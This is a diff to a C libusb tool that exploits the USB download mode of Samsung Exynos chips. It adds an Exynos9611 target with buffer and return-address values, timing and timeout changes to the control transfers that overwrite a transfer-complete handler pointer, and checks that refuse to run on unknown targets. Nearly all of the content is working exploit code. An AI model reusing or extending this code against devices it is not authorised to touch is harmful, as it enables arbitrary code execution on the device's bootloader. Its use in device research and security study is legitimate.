@@ -5,6 +5,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <stdbool.h>
 #include <string.h>
 #include <assert.h>
 #include "libusb-1.0/libusb.h"
@@ -95,6 +96,14 @@ static target_data targets[] = {
 		{0x02021800,	0x280},
 	},
 	{
+		.name = "Exynos9611",
+		.supports_zero_length_bulk_exploit = false,
+		.supports_get_configuration_exploit = true,
+		//XFER_BUFFER,	RA_PTR
+		{0x0, 0x0},
+		{0x02021800,	0x280},
+	},
+	{
 		.name = "Exynos9810",
 		.supports_zero_length_bulk_exploit = false,
 		.supports_get_configuration_exploit = true,
@@ -154,10 +163,11 @@ static int newexploit(dldata_t *payload, int target_id) {
 		total_size -= transferred;
 	} while(total_size > 0);
 
-	rc = libusb_control_transfer(handle, 0x80, 8, 0x0000, 0x0000, test, target_data->control_to_struct_offset + sizeof(get_conf_usb_struct), 0);
+	rc = libusb_control_transfer(handle, 0x80, 8, 0x0000, 0x0000, test, target_data->control_to_struct_offset + sizeof(get_conf_usb_struct), 5000);
 	usb_struct->event_counter += 5;
 	usb_struct->xfercomplete_handler_ptr = target_data->xfer_buffer;
-	rc = libusb_control_transfer(handle, 0x00, 8, 0x0000, 0x0000, test, target_data->control_to_struct_offset + sizeof(get_conf_usb_struct), 0);
+	usleep(10000);
+rc = libusb_control_transfer(handle, 0x00, 8, 0x0000, 0x0000, test, target_data->control_to_struct_offset + sizeof(get_conf_usb_struct), 5000);
 
 	if(rc) {
 		fprintf(stderr, "Error write libusb_control_transfer: %s\n", libusb_error_name(rc));
@@ -450,6 +460,10 @@ int main(int argc, char *argv[])
 
 	if(mode == EXPLOIT_MODE){
 		target_id = identify_target();
+		if (target_id < 0) {
+			fprintf(stderr, "Unknown target, refusing to run exploit mode.\n");
+			return EXIT_FAILURE;
+		}
 		if (targets[target_id].supports_zero_length_bulk_exploit) {
 			exploit(payload, target_id);
 
@@ -464,6 +478,10 @@ int main(int argc, char *argv[])
 		}
 	}else if (mode == NEWEXPLOIT_MODE){
 		target_id = identify_target();
+		if (target_id < 0) {
+			fprintf(stderr, "Unknown target, refusing to run new exploit mode.\n");
+			return EXIT_FAILURE;
+		}
 		if (targets[target_id].supports_get_configuration_exploit) {
 			printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
 			rc = newexploit(payload, target_id);
